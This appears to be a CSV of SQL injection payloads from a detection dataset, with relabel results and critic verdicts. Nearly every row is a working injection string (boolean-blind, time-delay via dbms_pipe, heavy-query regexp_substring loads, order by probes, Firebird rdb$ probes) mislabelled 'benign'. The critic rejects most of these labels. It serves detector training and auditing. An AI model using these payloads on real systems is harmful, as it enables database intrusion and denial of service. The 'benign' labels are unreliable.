row_index,payload_norm,sqli_type,db_engine,confidence,reasoning,label_source,verdict,critic_evidence,correction_json
3695,"1 ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
3784,-8641%' order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
3834,"-1917"" ) or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
3892,1' ) ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
3896,-2781 ) ) ) or 2573 = 5848--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
3909,"1' or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
3918,"1%' ) ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
3920,"1%' ) ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
3947,"1 ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
3972,1' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and 'pziy' = 'pziy,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
4083,"1%"" ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
4124,"1%' ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
4138,"1 ) ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
4176,"1' ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
4205,"1 ) and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
4228,-2790' ) ) or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4252,"1' ) as xagu where 9088 = 9088 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
4300,1'|| ( select 'zxla' from dual where 7634 = 7634 and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) ) ||',boolean_blind,oracle,0.95,7634 = 7634 and detected — boolean_blind injection (priority 8) on oracle,relabel-classifier,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=oracle","{""db_engine"": ""firebird""}"
4319,-2717' ) ) ) or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4324,"1' and char ( 111 ) ||char ( 77 ) ||char ( 121 ) ||char ( 88 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4360,"1%"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
4387,"-2964"" ) ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4388,"-9208%"" ) ) or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
4428,1 ) ) ) and 9575 = 1640--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4497,"1' ) as bagi where 1281 = 1281 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
4530,-5500' ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
4577,1' in boolean mode ) and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) #,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (5); parentheses mismatch (2 open, 3 close). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
4598,"1%"" ) ) ) and 9198 = 9198--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4648,-1730' or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4671,"1"" ) and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
4698,"1%"" ) ) ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
4756,"-6357"" ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
4781,1%' and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' ) and '%' = ',benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
4821,"1 ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
4866,-3339' or 8571 = 8571--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4870,"1' where 3125 = 3125 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
4892,"1"" and 6240 = ( 'qqpjq'|| ( select case 6240 when 6240 then 1 else 0 end from rdb$database ) ||'qzvzq' )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1). Payload syntax not complete, confidence may need adjustment | [C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
4967,"1%' ) ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 8 close). Plus attack signal detected -> benign label wrong",
4990,"-4462%"" ) or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
5010,-8404 ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
5044,"1 ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
5071,"1' ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
5085,"1%' ) ) and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
5095,"1%"" ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 10 close). Plus attack signal detected -> benign label wrong",
5110,1%' ) ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
5112,1 ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
5122,"1 ) ) as bebl where 2597 = 2597 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
5143,"-6595"" order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5169,"-9535"" order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5175,"1 ) ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (5 open, 7 close). Plus attack signal detected -> benign label wrong",
5199,-9014' order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
5229,"1%"" and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5288,1 ) ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
5294,-6015%' ) order by 1--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
5300,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ""%"" = """,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (3). Plus attack signal detected -> benign label wrong,
5308,"1' ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
5329,"1 ) as tkkn where 7832 = 7832 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (16 open, 17 close). Plus attack signal detected -> benign label wrong",
5334,"1%"" ) and 9198 = 9198--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
5353,select 'qqpjq'|| ( case 5118 when 5118 then 1 else 0 end ) ||'qzvzq' from rdb$database,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C8] Historical DB mismatch: 'rdb$' is firebird-exclusive, but db_engine=unknown","{""db_engine"": ""firebird""}"
5374,"1"" and 9468 = 7105--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5377,"1' in boolean mode ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
5378,"1"" or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5391,"1"" ) ) ) and 9198 = 9198--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
5418,"1' in boolean mode ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) #",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
5427,"1' and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
5443,1 ) ) ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 3 close). Plus attack signal detected -> benign label wrong",
5449,"1' and char ( 107 ) ||char ( 121 ) ||char ( 97 ) ||char ( 80 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
5453,"1"" ) ) ) or char ( 75 ) ||char ( 70 ) ||char ( 99 ) ||char ( 83 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 14 close). Plus attack signal detected -> benign label wrong",
5456,"1%"" ) ) and 9198 = 9198--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
5506,"1"" ) ) ) and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 11 close). Plus attack signal detected -> benign label wrong",
5534,1 ) ) and 9198 = 9198--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
5542,"1"" or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5556,"1' ) or char ( 117 ) ||char ( 111 ) ||char ( 105 ) ||char ( 100 ) = regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced single quotes (1); parentheses mismatch (11 open, 12 close). Plus attack signal detected -> benign label wrong",
5595,"1%"" ) order by 1--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 1 close). Plus attack signal detected -> benign label wrong",
5608,"-1203"" ) ) or 8571 = 8571--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (0 open, 2 close). Plus attack signal detected -> benign label wrong",
5639,"1"" ) or char ( 119 ) ||char ( 100 ) ||char ( 99 ) ||char ( 121 ) = regexp_substring ( repeat ( right ( char ( 1441 ) ,0 ) ,5000000000 ) ,null ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
5641,"1"" ) ) as aamh where 7432 = 7432 ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (11 open, 13 close). Plus attack signal detected -> benign label wrong",
5793,"1 ) or char ( 68 ) ||char ( 69 ) ||char ( 97 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 5389 ) ,0 ) ,5000000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: parentheses mismatch (8 open, 9 close). Plus attack signal detected -> benign label wrong",
5803,"1' or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
5830,"1"" and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null )",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5836,"1"" ) ) as exzo where 7518 = 7518 ( select ( case when ( 4587 = 4587 ) then regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) else char ( 76 ) ||char ( 65 ) ||char ( 102 ) ||char ( 72 ) end ) from ( values ( 0 ) ) ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (16 open, 18 close). Plus attack signal detected -> benign label wrong",
5887,"-8608"" or 5460 = 4461--",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced double quotes (1). Plus attack signal detected -> benign label wrong,
5922,-1436' or 5699 = 5783--,benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,[C7] Structural issue: unbalanced single quotes (1). Plus attack signal detected -> benign label wrong,
5935,"1"" ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",benign,unknown,0.60,No attack signals detected after re-label,relabel-benign-fallback,REJECT,"[C7] Structural issue: unbalanced double quotes (1); parentheses mismatch (5 open, 6 close). Plus attack signal detected -> benign label wrong",
